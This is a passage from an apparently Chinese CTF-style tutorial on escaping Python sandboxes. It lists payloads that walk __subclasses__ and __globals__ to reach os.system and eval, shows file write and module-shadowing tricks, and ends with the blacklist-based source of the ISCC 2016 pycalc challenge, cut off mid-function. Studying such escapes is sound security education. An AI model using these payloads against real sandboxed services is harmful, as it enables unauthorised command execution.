class="hljs-string">&#x27;frozenset&#x27;</span>&gt;)<br>(<span class="hljs-number">22</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;)<br>(<span class="hljs-number">23</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;)<br>(<span class="hljs-number">24</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;)<br>(<span class="hljs-number">25</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;)<br>(<span class="hljs-number">26</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;)<br>(<span class="hljs-number">27</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;)<br>(<span class="hljs-number">28</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;)<br>(<span class="hljs-number">29</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;)<br>(<span class="hljs-number">30</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;)<br>(<span class="hljs-number">31</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;)<br>(<span class="hljs-number">32</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;)<br>(<span class="hljs-number">33</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">34</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;)<br>(<span class="hljs-number">35</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">36</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">37</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;)<br>(<span class="hljs-number">38</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;)<br>(<span class="hljs-number">39</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">40</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;)<br>(<span class="hljs-number">41</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;)<br>(<span class="hljs-number">42</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;)<br>(<span class="hljs-number">43</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">44</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">45</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;)<br>(<span class="hljs-number">46</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;)<br>(<span class="hljs-number">47</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;)<br>(<span class="hljs-number">48</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;)<br>(<span class="hljs-number">49</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;)<br>(<span class="hljs-number">50</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;)<br>(<span class="hljs-number">51</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;)<br>(<span class="hljs-number">52</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;)<br>(<span class="hljs-number">53</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;)<br>(<span class="hljs-number">54</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;)<br>(<span class="hljs-number">55</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)<br>(<span class="hljs-number">56</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;)<br>(<span class="hljs-number">57</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;)<br>(<span class="hljs-number">58</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)<br>(<span class="hljs-number">59</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)<br>(<span class="hljs-number">60</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)<br>(<span class="hljs-number">61</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)<br>(<span class="hljs-number">62</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)<br>(<span class="hljs-number">63</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">64</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)<br>(<span class="hljs-number">65</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;)<br>(<span class="hljs-number">66</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;)<br>(<span class="hljs-number">67</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;)<br>(<span class="hljs-number">68</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;)<br>(<span class="hljs-number">69</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;)<br>(<span class="hljs-number">70</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;)<br>(<span class="hljs-number">71</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)<br>(<span class="hljs-number">72</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;)<br>(<span class="hljs-number">73</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)<br>(<span class="hljs-number">74</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)<br>(<span class="hljs-number">75</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)<br>(<span class="hljs-number">76</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)<br>(<span class="hljs-number">77</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)<br>(<span class="hljs-number">78</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p><p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> warnings<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;os&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache<br>&lt;module <span class="hljs-string">&#x27;linecache&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>其中<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, record=<span class="hljs-literal">False</span>, module=<span class="hljs-literal">None</span></span>):<br>...<br>        <span class="hljs-variable language_">self</span>._module = sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>] <span class="hljs-keyword">if</span> module isNoneelse module<br>...<br></code></pre></td></tr></table></figure><p>所以通过<code>_module</code>也可以构造 payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>).__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span>][<span class="hljs-number">0</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>如果object没被过滤还可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__getattribute__(<span class="hljs-string">&#x27;append&#x27;</span>).__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">dict</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">super</span>(test, <span class="hljs-variable language_">self</span>).keys.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br>        <span class="hljs-comment"># 如果是 3.x 的话可以简写为：</span><br>        <span class="hljs-comment"># super().keys.__class__.__call__(eval, &#x27;1+1&#x27;))</span><br>test()<br></code></pre></td></tr></table></figure><p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性&#x2F;方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类&#x2F;类型<code>__call__</code>后直接运行<code>eval</code>。</p><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>2.x 有个内建的 <code>file</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p>还有个 <code>open</code>，2.x 与 3.x 通用。</p><p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p><p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来： math.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br></code></pre></td></tr></table></figure><p>调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br>admin<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;math&#x27;</span><span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">False</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>当然在<code>import re</code> 之前<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p><p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>读文件暂时没什么发现特别的地方。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin\n&#x27;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了[]"></a>过滤了[]</h2><p>用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">59</span>).__init__.func_globals.get(<span class="hljs-string">&#x27;linecache&#x27;</span>).os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br><span class="hljs-string">&#x27;kali\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p>来自iscc 2016的Pwn300 pycalc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">banner</span>():<br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;   Simple calculator implemented by python   &quot;</span><br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getexp</span>():<br>    <span class="hljs-keyword">return</span> raw_input(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hook_import_</span>(<span class="hljs-params">name, *args, **kwargs</span>):<br>    module_blacklist = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>,<br>                        <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>,<br>                        <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>                        <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>,<br>                        <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>,<br>                        <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>,<br>                        <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>,<br>                        <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>,<br>                        <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> module_blacklist:<br>        <span class="hljs-keyword">if</span> name == forbid:        <span class="hljs-comment"># don&#x27;t let user import these modules</span><br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="hljs-built_in">format</span>(forbid))<br>    <span class="hljs-comment"># normal modules can be imported</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(name, *args, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>                 <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            return0<br>    return1<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_exec</span>(<span class="hljs-params">command</span>):<span class="hljs-comment"># sandbox user input</span><br>    result = <span class="hljs-number">0</span><br>    __sandboxed_builtins__ = <span class="hljs-built_in">dict</span>(__builtins__.__dict__)<br>    __sandboxed_builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="hljs-comment"># hook import</span><br>    <span class="hljs-keyword">del</span> __sandboxed_builtins__[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    _<span class="hljs-keyword">global</span> = &#123;<br>        <span class="hljs-string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__<br>    &#125;<br>    <span class="hljs-keyword">if</span> sandbox_filter(command) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span><span class="hljs-string">&#x27;Malicious user input detected!!!&#x27;</span><br>        exit(<span class="hljs-number">0</span>)<br>    command = <span class="hljs-string">&#x27;result = &#x27;</span> + command<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span> command <span class="hljs-keyword">in</span> _<span class="hljs-keyword">global</span>     <span class="hljs-comment"># do calculate in a sandboxed environment</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> e<br>        return0<br>    result = _<span 